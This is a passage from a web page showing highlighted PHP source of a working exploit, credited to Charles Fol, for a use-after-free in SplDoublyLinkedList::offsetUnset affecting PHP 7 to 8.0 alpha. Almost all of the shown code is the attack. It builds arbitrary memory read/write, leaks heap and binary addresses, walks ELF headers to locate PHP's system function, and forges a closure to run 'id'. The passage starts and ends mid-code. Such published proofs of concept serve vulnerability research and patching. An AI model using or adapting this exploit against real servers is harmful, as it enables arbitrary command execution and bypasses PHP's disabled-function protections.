</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1">#
</span><span class="c1"># PHP SplDoublyLinkedList::offsetUnset UAF
</span><span class="c1"># Charles Fol (@cfreal_)
</span><span class="c1"># 2020-08-07
</span><span class="c1"># PHP is vulnerable from 5.3 to 8.0 alpha
</span><span class="c1"># This exploit only targets PHP7+.
</span><span class="c1">#
</span><span class="c1"># SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.
</span><span class="c1"># Said iteration is done by keeping a pointer to the &#34;current&#34; DLL element.
</span><span class="c1"># You can then call next() or prev() to make the DLL point to another element.
</span><span class="c1"># When you delete an element of the DLL, PHP will remove the element from the
</span><span class="c1"># DLL, then destroy the zval, and finally clear the current ptr if it points
</span><span class="c1"># to the element. Therefore, when the zval is destroyed, current is still
</span><span class="c1"># pointing to the associated element, even if it was removed from the list.
</span><span class="c1"># This allows for an easy UAF, because you can call $dll-&gt;next() or
</span><span class="c1"># $dll-&gt;prev() in the zval&#39;s destructor.
</span><span class="c1">#  
</span><span class="c1">#
</span><span class="c1"></span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>

<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;NB_DANGLING&#39;</span><span class="p">,</span> <span class="mi">200</span><span class="p">);</span>
<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;SIZE_ELEM_STR&#39;</span><span class="p">,</span> <span class="mi">40</span> <span class="o">-</span> <span class="mi">24</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;STR_MARKER&#39;</span><span class="p">,</span> <span class="mh">0xcf5ea1</span><span class="p">);</span>

<span class="k">function</span> <span class="nf">i2s</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="nv">$x</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nv">$x</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$s</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">);</span>
        <span class="nv">$i</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="k">function</span> <span class="nf">s2i</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$s</span><span class="p">,</span> <span class="nv">$p</span><span class="p">,</span> <span class="nv">$x</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="nv">$x</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$j</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">--</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$i</span> <span class="o">&lt;&lt;=</span> <span class="mi">8</span><span class="p">;</span>
        <span class="nv">$i</span> <span class="o">|=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$p</span><span class="o">+</span><span class="nv">$j</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$i</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">class</span> <span class="nc">UAFTrigger</span>
<span class="p">{</span>
    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$dlls</span><span class="p">,</span> <span class="nv">$strs</span><span class="p">,</span> <span class="nv">$rw_dll</span><span class="p">,</span> <span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">;</span>

        <span class="c1">#&#34;print(&#39;UAF __destruct: &#39; . &#34;\n&#34;);
</span><span class="c1"></span>        <span class="nv">$dlls</span><span class="p">[</span><span class="nx">NB_DANGLING</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">offsetUnset</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        
        <span class="c1"># At this point every $dll-&gt;current points to the same freed chunk. We allocate
</span><span class="c1"></span>        <span class="c1"># that chunk with a string, and fill the zval part
</span><span class="c1"></span>        <span class="nv">$fake_dll_element</span> <span class="o">=</span> <span class="nx">str_shuffle</span><span class="p">(</span><span class="nx">str_repeat</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="nx">SIZE_ELEM_STR</span><span class="p">));</span>
        <span class="nx">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x12345678</span><span class="p">);</span> <span class="c1"># ptr
</span><span class="c1"></span>        <span class="nx">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x00000004</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span> <span class="c1"># type + other stuff
</span><span class="c1"></span>        
        <span class="c1"># Each of these dlls current-&gt;next pointers point to the same location,
</span><span class="c1"></span>        <span class="c1"># the string we allocated. When calling next(), our fake element becomes
</span><span class="c1"></span>        <span class="c1"># the current value, and as such its rc is incremented. Since rc is at
</span><span class="c1"></span>        <span class="c1"># the same place as zend_string.len, the length of the string gets bigger,
</span><span class="c1"></span>        <span class="c1"># allowing to R/W any part of the following memory
</span><span class="c1"></span>        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;=</span> <span class="nx">NB_DANGLING</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
            <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">next</span><span class="p">();</span>

        <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nx">SIZE_ELEM_STR</span><span class="p">)</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Exploit failed: fake_dll_element did not increase in size&#39;</span><span class="p">);</span>
        
        <span class="nv">$leaked_str_offsets</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="nv">$leaked_str_zval</span> <span class="o">=</span> <span class="p">[];</span>

        <span class="c1"># In the memory after our fake element, that we can now read and write,
</span><span class="c1"></span>        <span class="c1"># there are lots of zend_string chunks that we allocated. We keep three,
</span><span class="c1"></span>        <span class="c1"># and we keep track of their offsets.
</span><span class="c1"></span>        <span class="k">for</span><span class="p">(</span><span class="nv">$offset</span> <span class="o">=</span> <span class="nx">SIZE_ELEM_STR</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$offset</span> <span class="o">&lt;=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">)</span> <span class="o">-</span> <span class="mi">40</span><span class="p">;</span> <span class="nv">$offset</span> <span class="o">+=</span> <span class="mi">40</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1"># If we find a string marker, pull it from the string list
</span><span class="c1"></span>            <span class="k">if</span><span class="p">(</span><span class="nx">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$offset</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">==</span> <span class="nx">STR_MARKER</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="nv">$leaked_str_offsets</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$offset</span><span class="p">;</span>
                <span class="nv">$leaked_str_zval</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$strs</span><span class="p">[</span><span class="nx">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$offset</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)];</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Exploit failed: unable to leak three zend_strings&#39;</span><span class="p">);</span>
        
        <span class="c1"># free the strings, except the three we need
</span><span class="c1"></span>        <span class="nv">$strs</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>

        <span class="c1"># Leak adress of first chunk
</span><span class="c1"></span>        <span class="nx">unset</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="nx">unset</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="nx">unset</span><span class="p">(</span><span class="nv">$leaked_str_zval</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
        <span class="nv">$first_chunk_addr</span> <span class="o">=</span> <span class="nx">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

        <span class="c1"># At this point we have 3 freed chunks of size 40, which we can read/write,
</span><span class="c1"></span>        <span class="c1"># and we know their address.
</span><span class="c1"></span>        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Address of first RW chunk: 0x&#39;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$first_chunk_addr</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>

        <span class="c1"># In the third one, we will allocate a DLL element which points to a zend_array
</span><span class="c1"></span>        <span class="nv">$rw_dll</span><span class="o">-&gt;</span><span class="na">push</span><span class="p">([</span><span class="mi">3</span><span class="p">]);</span>
        <span class="nv">$array_addr</span> <span class="o">=</span> <span class="nx">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
        <span class="c1"># Change the zval type from zend_object to zend_string
</span><span class="c1"></span>        <span class="nx">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00000006</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">gettype</span><span class="p">(</span><span class="nv">$rw_dll</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">!=</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Exploit failed: Unable to change zend_array to zend_string&#39;</span><span class="p">);</span>
        
        <span class="c1"># We can now read anything: if we want to read 0x11223300, we make zend_string*
</span><span class="c1"></span>        <span class="c1"># point to 0x11223300-0x10, and read its size using strlen()
</span><span class="c1"></span>
        <span class="c1"># Read zend_array-&gt;pDestructor
</span><span class="c1"></span>        <span class="nv">$zval_ptr_dtor_addr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$array_addr</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">);</span>
    
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Leaked zval_ptr_dtor address: 0x&#39;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$zval_ptr_dtor_addr</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>

        <span class="c1"># Use it to find zif_system
</span><span class="c1"></span>        <span class="nv">$system_addr</span> <span class="o">=</span> <span class="nx">get_system_address</span><span class="p">(</span><span class="nv">$zval_ptr_dtor_addr</span><span class="p">);</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Got PHP_FUNCTION(system): 0x&#39;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$system_addr</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
        
        <span class="c1"># In the second freed block, we create a closure and copy the zend_closure struct
</span><span class="c1"></span>        <span class="c1"># to a string
</span><span class="c1"></span>        <span class="nv">$rw_dll</span><span class="o">-&gt;</span><span class="na">push</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$x</span><span class="p">)</span> <span class="p">{});</span>
        <span class="nv">$closure_addr</span> <span class="o">=</span> <span class="nx">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nx">str_shuffle</span><span class="p">(</span><span class="nx">str_repeat</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">));</span>

        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x138</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nx">i2s</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$closure_addr</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">));</span>
        <span class="p">}</span>
        
        <span class="c1"># Change internal func type and pointer to make the closure execute system instead
</span><span class="c1"></span>        <span class="nx">i2s</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="nx">i2s</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$system_addr</span><span class="p">);</span>
        
        <span class="c1"># Push our string, which contains a fake zend_closure, in the last freed chunk that
</span><span class="c1"></span>        <span class="c1"># we control, and make the second zval point to it.
</span><span class="c1"></span>        <span class="nv">$rw_dll</span><span class="o">-&gt;</span><span class="na">push</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="nv">$fake_zend_closure</span> <span class="o">=</span> <span class="nx">s2i</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="mi">24</span><span class="p">;</span>
        <span class="nx">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="nv">$fake_zend_closure</span><span class="p">);</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Replaced zend_closure by the fake one: 0x&#39;</span> <span class="o">.</span> <span class="nx">dechex</span><span class="p">(</span><span class="nv">$fake_zend_closure</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
        
        <span class="c1"># Calling it now
</span><span class="c1"></span>        
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Running system(&#34;id&#34;);&#39;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
        <span class="nv">$rw_dll</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>

        <span class="nx">print_r</span><span class="p">(</span><span class="s1">&#39;DONE&#39;</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">DanglingTrigger</span>
<span class="p">{</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$i</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">i</span> <span class="o">=</span> <span class="nv">$i</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">global</span> <span class="nv">$dlls</span><span class="p">;</span>
        <span class="c1">#D print(&#39;__destruct: &#39; . $this-&gt;i . &#34;\n&#34;);
</span><span class="c1"></span>        <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">offsetUnset</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">push</span><span class="p">(</span><span class="mi">123</span><span class="p">);</span>
        <span class="nv">$dlls</span><span class="p">[</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">offsetUnset</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">SystemExecutor</span> <span class="k">extends</span> <span class="nx">ArrayObject</span>
<span class="p">{</span>
    <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$x</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">parent</span><span class="o">::</span><span class="na">offsetGet</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="sd">/**
</span><span class="sd"> * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
</span><span class="sd"> * and setting its type to zend_string, so that zend_string-&gt;len points to the value
</span><span class="sd"> * we want to read.
</span><span class="sd"> */</span>
<span class="k">function</span> <span class="nf">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="nv">$s</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">global</span> <span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">,</span> <span class="nv">$rw_dll</span><span class="p">;</span>

    <span class="nx">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="nv">$addr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="nx">i2s</span><span class="p">(</span><span class="nv">$fake_dll_element</span><span class="p">,</span> <span class="nv">$leaked_str_offsets</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00000006</span><span class="p">);</span>

    <span class="nv">$value</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$rw_dll</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>

    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span>
        <span class="nv">$value</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="nv">$s</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
        <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
        <span class="c1"># ELF header
</span><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span>
            <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1"># We&#39;ll crash before this but it&#39;s clearer this way
</span><span class="c1"></span>    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Exploit failed: Unable to find ELF header&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$e_type</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

    <span class="nv">$e_phoff</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">);</span>
    <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$base</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
        <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$header</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$header</span> <span class="o">+</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
        <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$header</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
        <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$header</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_Write
</span><span class="c1"></span>            <span class="c1"># handle pie
</span><span class="c1"></span>            <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
            <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_exec
</span><span class="c1"></span>            <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Exploit failed: Unable to parse ELF&#39;</span><span class="p">);</span>

    <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$deref</span> <span class="o">=</span> <span class="nx">read</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
            <span class="c1"># &#39;constant&#39; constant check
</span><span class="c1"></span>            <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
                <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

